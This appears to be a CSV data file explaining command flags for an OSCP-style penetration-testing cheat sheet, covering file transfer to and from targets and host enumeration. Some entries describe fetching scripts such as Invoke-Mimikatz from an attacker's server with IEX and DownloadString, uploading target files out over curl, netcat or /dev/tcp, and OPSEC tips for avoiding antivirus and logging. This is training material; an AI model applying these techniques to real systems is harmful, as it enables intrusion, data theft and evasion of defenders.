"id","flag","explanation"
"3dfc397dc1afee73","New-Object System.Net.WebClient","Instantiate .NET WebClient class - provides HTTP download capabilities without PowerShell cmdlet overhead"
"d273ed60c1b8029c","DownloadFile()","Synchronous download method - blocks until complete, faster than Invoke-WebRequest for large files"
"af2ca84ed5833e95","Single quotes","Required around URLs to prevent PowerShell variable expansion if URL contains $ or other special chars"
"08336a3f810b6ad1","Full output path","Must include directory AND filename - will not infer filename from URL like Invoke-WebRequest"
"787cdf756cb19848","\\\\<LHOST>\\<SHARE>","UNC path format - standard Windows network path to access SMB shares"
"ff953a746fd81df0","copy","Native Windows command - can also use xcopy /y for overwrite without prompt, or robocopy for advanced options"
"36f757ef058d45ea","/y","Optional flag to suppress overwrite confirmation prompt - useful in scripts: copy /y source dest"
"24656463ae7de95e","<JOB_NAME>","Job identifier - used for tracking transfer status. Can list all jobs: bitsadmin /list"
"9dc8259ea73b1dc7","Absolute path required","OUTPUT must be full path like C:\file.exe, not relative like file.exe"
"89959c5250fdedd8","Invoke-RestMethod","PowerShell cmdlet for REST API operations - simpler than Invoke-WebRequest for POST uploads"
"ab92086149260a08","-Method Post","HTTP method - required for file uploads"
"0cb34ff5f999b1ed","-InFile","Input file path - file to upload from target system"
"b8dc680c82287804","Single quotes around path","Required if path contains spaces or special characters"
"a688120b6b8f0d6b","Quotes around path","Required if filename/path contains spaces"
"0091c7d963e89b69","Trailing backslash","Important - indicates destination is directory, not filename"
"92b32889d5918878","-X POST","HTTP method - specify POST for file uploads (required for uploadserver /upload endpoint)"
"c0e4edd67dc0bd8d","-F file=@<PATH>","Form upload - reads file content and sends as multipart/form-data. @ prefix reads from file"
"edc972152d5310c8","-#","Progress bar - cleaner output than default verbose progress, useful for large files: curl -# -X POST..."
"19e4538ff7bbf238",">","Redirect stdout to file - saves all received data to specified file"
"4e9b5173dccf0575","<","Input redirection - reads file content and sends through netcat connection"
"2d1c03c29a65f1e4","-w 1","Optional timeout - close connection 1 second after EOF (ensures clean disconnect): nc -w 1 <IP> <PORT> < file"
"f542b8f3168d5e45","New-Object System.Net.Sockets.TcpClient","Creates TCP client object - native PowerShell, no external dependencies. Opens connection to specified IP:port"
"c35d3832e002990c","GetStream()","Gets network stream from TCP connection - provides read/write capabilities"
"c869d7ea00eb4829","New-Object System.IO.StreamWriter","Creates text writer for sending data - handles line-by-line writing efficiently"
"92e572ff1c91a38f","Get-Content","Reads file content line-by-line - PowerShell native cmdlet, works with text files"
"5fc80a61a9e2351b","ForEach-Object { $writer.WriteLine($_) }","Writes each line to TCP stream - $_ represents current line in pipeline"
"123faae8255a76d4","$writer.Flush()","Forces buffered data to send immediately - ensures all data transmitted before closing"
"ca92cf48a9e6631f","$client.Close()","Closes TCP connection cleanly - signals end of transmission to receiver"
"d660bf15c350646c","md5sum","Calculate MD5 (Message Digest 5) hash of file contents. Produces 32-character hexadecimal fingerprint. Same file = same MD5. Even 1-byte difference = completely different hash. CRITICAL FOR OSCP: Verify exploits/scripts transferred correctly before execution. Corrupted binaries waste precious exam time with cryptic errors."
"74d642ae365cefa3","Windows equivalent","Get-FileHash -Algorithm MD5 <FILE> | Select-Object -ExpandProperty Hash (PowerShell). Or certutil -hashfile <FILE> MD5 (older Windows). Both produce same 32-hex MD5 as Linux md5sum."
"ca897e59a857d1bd","<FILE>","File to verify. Can be absolute or relative path. Examples: ./exploit.sh, /tmp/nc.exe, C:\Windows\Temp\payload.exe"
"05f324a0f30df176","IEX","Invoke-Expression cmdlet - executes string as PowerShell code. Alias for Invoke-Expression. CRITICAL: Downloaded script runs directly in memory, never written to disk. OPSEC ADVANTAGE: No file I/O events (Event ID 4663), no AV file scan, no forensic disk artifacts. DISADVANTAGE: Logged in PowerShell transcription/module logging if enabled."
"09109f457da106e6","New-Object Net.WebClient","Creates .NET WebClient object for HTTP operations. ALTERNATIVE: Invoke-WebRequest (IWR) is newer but more logged. WebClient is stealthier - generates less ETW telemetry. Works on PowerShell 2.0+ (including old Windows 7/2008)."
"6778cf4cc36cf60d",".DownloadString()","Downloads file as string (text). Returns content directly to memory. CRITICAL: Use DownloadString for scripts (.ps1), NOT DownloadFile (which writes to disk). DownloadString keeps payload in RAM only."
"db554356418e3888","http://<LHOST>/<SCRIPT>.ps1","URL of PowerShell script on attacker's web server. OSCP SETUP: Start HTTP server on Kali: python3 -m http.server 80. Place script in web root: /var/www/html/ or current directory. URL example: http://10.10.14.5/Invoke-Mimikatz.ps1"
"2e6551d59038bcb1","-w0","Wrap width 0 - disable line wrapping, output single line (required for easy copy/paste). Default wraps at 76 chars"
"2799803b63c2e798","-i <INPUT>","Input file - alternative to redirection: base64 -w0 -i file.exe"
"32912d25dc38e6ff","Without -w0","Output wrapped at 76 chars - harder to copy/paste, need to remove newlines"
"eb89667497e4e7d7","-P <PORT>","SSH port - use capital P for scp (lowercase -p is preserve timestamps): scp -P 2222 file user@host:/tmp/"
"ea06568613669e3d","-i <KEY>","SSH private key - use instead of password: scp -i id_rsa file user@host:/tmp/"
"f9bb7a628382fe7c","Colon syntax","user@host:/path separates host from path - colon required"
"d6c56f5eb93a99ec","-P <DIR>","Download to directory - alternative to -O, saves file with original name in specified directory"
"57068a826014b61c","/dev/tcp/<IP>/<PORT>","Bash pseudo-device - creates TCP connection to IP:PORT. Built into bash, no external commands needed"
"22a0d06f12282218","cat <","Read from TCP connection - receives data from pseudo-device"
"def78afe9ac8cb35","> <OUTPUT>","Redirect to file - saves received data to specified file"
"2a2f2c7c239f4f32","/dev/udp/<IP>/<PORT>","Alternative for UDP connections - less common but available"
"d2a0889bebd3a94d","http.server","Built-in Python module that provides a simple HTTP server - no installation required, available on Kali and most Linux systems"
"4d9156f138fa4f81","<PORT>","Listening port - common choices are 80 (requires sudo), 443 (requires sudo), 8000 (default), 8080, or any high port (1024-65535)"
"e20a5fd5d26269e9","-username <USER>","Require authentication with this username - use when target requires credentials (newer Windows updates)"
"f5a42ea49b11b153","-password <PASS>","Set password for authenticated access - pair with -username when SMB signing required"
"ecba68a8b4776393","<SHARE_NAME>","Arbitrary name you choose - targets access via \\<KALI_IP>\<SHARE_NAME>. Common choices: share, tools, files"
"d9d6d0be12c59a85","<DIRECTORY>","Absolute or relative path - serves this folder's contents. Use . to serve current directory"
"cf8845fbc16a459e","-m uploadserver","Run uploadserver module - simple HTTP server with POST upload endpoint at /upload"
"07a720ae3174b72e","--directory <DIR>","Save uploaded files to specific directory instead of current directory"
"1a582c8b8c74d735","--basic-auth <USER>:<PASS>","Require HTTP basic authentication for uploads"
"ba5806316f3f58de","-sTCP:LISTEN","Select only TCP connections in LISTEN state (waiting for incoming connections)"
"1f2a2e3a7ceedf11",":<PORT>","Filter by specific port number (checks both TCP and UDP)"
"0460c33499b2bd8b","/tcp","Specify TCP protocol (use /udp for UDP)"
"af9299230b308535","state established","Filter to show only established connections (active data transfer)"
"4d0586130ef4ae40","Get-NetTCPConnection","Retrieves TCP connection properties"
"ce99a1420bc164fe","Select-Object","Choose specific properties to display"
"aac19af2ca0b9472","OwningProcess","PID of process that owns the connection"
"dea27092cb5332aa","/fi","Filter - apply filter to tasklist output"
"27ecfa712c4fb3eb","""PID eq <PID>""","Filter expression - show only process with matching PID"
"314aa0a7990b85ef","process","Query Win32_Process class"
"051692a57f32fab6","where ProcessId=<PID>","Filter to specific PID"
"e0d8fb2ed8c4b416","get","Retrieve specific properties"
"ba77d5108e648cad","CommandLine","Full command with arguments (may contain credentials)"
"84b0d14fab4b5539","list-units","List loaded units (services, sockets, targets, etc.)"
"cd739a1f9da9f7d1","--type=service","Filter to show only service units"
"c0df7679060c7edd","--state=running","Filter to show only services in running state (active)"
"ef5d520eb2038d80","list-unit-files","List all available unit files (not just loaded units)"
"cea4e6ff67e6bc0a","--state=enabled","Show only services enabled for auto-start at boot"
"b3c4dce2778bd0c5","ls -la","Long listing with all files including hidden"
"a35a8efc56aef5a7","/etc/systemd/system/","Directory for custom/user-created service files"
"9b452db1c8e51f41","*.service","Wildcard for all service unit files"
"fad342c6b8b3ccb9","--status-all","Display status of all services (+ for running, - for stopped, ? for unknown)"
"086f282bddee79b6","--list","List all services and their runlevel configuration (0-6 runlevels)"
"36260dba83bb5fa8","query","Query service status (no arguments = all services)"
"fb21cc2e55b295aa","state= all","Include all states (running, stopped, paused). NOTE: Space after '=' is required by sc.exe syntax"
"79472352ab7cd390","service","Query Win32_Service WMI class"
"4a85597130a5a6c5","list","List service instances"
"8bb25c238a207acf","brief","Display brief format (ExitCode, Name, ProcessId, StartMode, State, Status)"
"da22f50696351ea5","Name","Service name"
"401c47b48298f57f","PathName","Full path to service executable (CRITICAL for finding unquoted paths)"
"a4378341254da6a7","StartMode","Auto, Manual, or Disabled"
"ad9acf62ef25e7dd","State","Running, Stopped, etc."
"f201acf1f3b2a3d4","Get-Service","Retrieves all Windows services"
"325860663ecba880","Where-Object","Filters results based on condition"
"e737cb1bb0b11fff","$_.Status -eq ""Running""","Filter to show only services with Running status"
"915d6a2e0c686f08","Get-WmiObject","Query WMI objects"
"4aea044b54cce735","win32_service","WMI class for services"
"08ad74e1d04b0e7f","tr '\0' ' '","Translates null bytes (\0) in cmdline files to spaces for readable output"
"db5592be1bbdab8e","awk '{print $2}'","Extracts second column (PID) from ps aux output"
"f54ee8e508268506","/etc/cron*","Glob pattern matching /etc/crontab, /etc/cron.d/, /etc/cron.daily/, etc."
"9fcbdb9b3b23b9b8","-u ssh","Filter logs for the ssh service unit"
"55b140e6db5b27ea","grep -i failed","Case-insensitive search for 'failed' in output"
"7ca74e8a3ec247a0","-n1","Run for 1 iteration only"
"052f24c0aa9c690d","-o %MEM","Sort by memory percentage"
"8c8f39b48faa51b6","| head -20","Show only first 20 lines (header + top processes)"
"f44c293385a9f20e","-o %CPU","Sort by CPU percentage"
"718f17b43473d15b","1","Sample interval in seconds"
"03c0e494499a3503","5","Number of samples to collect"
"3ba6049b082ed904","+d","Search directory for open files (non-recursive, faster)"
"36c12743d256e14d","utmpdump","Utility to decode binary utmp/wtmp files"
"01e160e2f9eaa881","/etc/cron.*","Wildcard matches cron.hourly, cron.daily, cron.weekly, cron.monthly, cron.d"
"44b03d895d7ecdbe","grep","Search for pattern"
"01e2cd0b084b26cd","""CRON""","Search pattern for cron log entries"
"66bfa6236b1c9c36","/var/log/syslog","System log file (may be /var/log/messages on RHEL)"
"fb583788332d7c09","/query","Display scheduled tasks"
"050efb695ea512cc","/fo LIST","Format output as list (easier to read than table)"
"80fbfcb068fb8f95","/v","Verbose - display detailed information including task actions, triggers, last run time"
"750ac0cf0f978958","Get-ScheduledTask","Retrieves all scheduled tasks"
"09aa0f434f33b955","$_.State -ne ""Disabled""","Exclude disabled tasks (show only Ready/Running tasks)"
"160ce94c56c0a9ef","-TaskName","Specify task name"
"7be8fd390a4e0eda","Get-ScheduledTaskInfo","Get additional info (last run time, last result, next run time)"
"acb964cb17c63b26","/tn","Task name with full path"
"aa6d9e50225c9f04","/xml","Output task definition in XML format (includes all configuration details)"
"3bbff11db934308b","job","Query Win32_ScheduledJob WMI class (AT command jobs)"
"7974eee858098b18","list full","Display all properties"
"efc209f489e8d316","list-timers","List timer units (systemd's scheduling mechanism)"
"f5351e8efa30f29b","--all","Show all timers including inactive ones"
"3252c773bdbbd2bd","| grep","Pipe to grep for filtering"
"0b8b2b77b05a6d5c","--line-buffered","Force grep to flush output immediately (required for real-time display)"
"f7b9323c9cc213a0","--since","Show entries from this time onward (inclusive)"
"3c6ec858baf6463f","--until","Show entries up to this time (inclusive)"
"d124e50cfede062f","""sudo.*COMMAND""","Pattern matches sudo entries with COMMAND field"
"e81143cf5c77efdb","--state=<STATE>","Filter by service state (running/failed/active/inactive/all). Use 'running' to find active attack surface. Use 'failed' to identify misconfigured services that might reveal privilege escalation paths. Use 'all' for comprehensive enumeration."
"834f314918e2b26f","--no-pager","Output results directly to terminal without using the pager (less). Essential when output is being piped to grep or redirected to a file. Always use in automated scripts."
